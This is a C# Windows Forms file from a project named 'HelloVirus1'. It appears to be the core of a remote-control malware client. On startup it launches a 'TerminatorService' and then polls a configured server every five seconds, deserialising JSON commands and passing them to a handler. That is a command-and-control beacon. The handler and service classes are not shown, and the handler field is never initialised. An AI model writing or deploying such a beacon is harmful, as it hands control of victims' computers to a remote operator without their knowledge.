using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using Newtonsoft.Json;

namespace HelloVirus1
{
    public partial class MainForm : Form
    {

        private HttpClient client;
        private CommandHandler handler;
        private Config config;
        private TerminatorService terminator;

        public MainForm()
        {
            InitializeComponent();
            client = new HttpClient();
            config = new Config();
            terminator = new TerminatorService();
            terminator.start();
        }

        private async void MainForm_Load(object sender, EventArgs e)
        {
            terminator.start();
            await StartListening();
        }


        private async Task StartListening()
        {
            while (true)
            {
                try
                {
                    string response = await client.GetStringAsync(config.serverUrl);

                    Command cmd = JsonConvert.DeserializeObject<Command>(response);

                    handler.Handle(cmd);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
                finally
                {
                    await Task.Delay(5000);
                }
            }
        }
    }
}
